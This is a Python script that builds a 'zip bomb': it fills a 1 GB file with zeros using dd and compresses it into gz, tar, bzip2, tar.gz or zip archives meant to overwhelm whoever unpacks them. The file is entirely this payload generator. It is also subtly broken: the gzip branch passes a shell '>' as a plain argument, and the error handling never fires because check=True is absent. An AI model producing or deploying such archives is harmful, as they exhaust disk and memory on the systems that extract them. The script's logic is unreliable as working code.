import subprocess

from log.factory import Logger
from utils.constants import DATA_FILE
from utils.file_handler import is_file_exists

logger = Logger(__name__)


def create_data_file():
    # Create a 1GB file of null chars
    try:
        logger.info("Creating data file for zip bomb...")
        subprocess.run(["dd", "if=/dev/zero", "of=" + DATA_FILE, "bs=1M", "count=1024"])
    except subprocess.CalledProcessError as e:
        logger.exception("Error occurred while creating data file ", e)


def create_zip_bomb(compression):
    create_data_file()
    if is_file_exists(DATA_FILE):
        try:
            logger.info("Creating data file for zip bomb...")
            # TODO: Need to check if it's the right command for gz
            if compression == "gz":
                comp_file = DATA_FILE + ".gz"
                subprocess.run(["gzip", "-c", DATA_FILE, ">", comp_file])
            elif compression == "tar":
                comp_file = DATA_FILE + ".tar"
                subprocess.run(["tar", "-cf", comp_file, DATA_FILE])
            elif compression == "bzip2":
                subprocess.run(["bzip2", "-zk", DATA_FILE])
            elif compression == "tar.gz":
                comp_file = DATA_FILE + ".tar.gz"
                subprocess.run(["tar", "-czf", comp_file, DATA_FILE])
            elif compression == "zip":
                comp_file = DATA_FILE + ".zip"
                subprocess.run(["zip", comp_file, DATA_FILE])

        except subprocess.CalledProcessError as e:
            logger.exception("Error occurred while creating data file ", e)


if __name__ == "__main__":
    create_zip_bomb("zip")
